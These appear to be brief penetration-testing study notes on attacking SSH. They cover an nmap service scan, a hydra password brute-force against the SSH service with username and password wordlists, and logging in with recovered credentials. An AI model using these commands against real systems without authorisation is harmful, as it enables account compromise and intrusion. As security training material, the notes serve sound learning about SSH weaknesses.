# Exploiting SSH

- Secure Shell - Successor of telnet
- Port 22 by default
- SSH Authentication has 2 ways:
	- username + password
		- can be brute forced
	- key based

## Demonstration

```bash
nmap -sV $TRG
```

Brute force with hydra:

```bash
hydra -L common_users.txt -P unix_passwords.txt -t 4 $TRG ssh
```

When found creds:

```bash
ssh <user>@$TRG
```
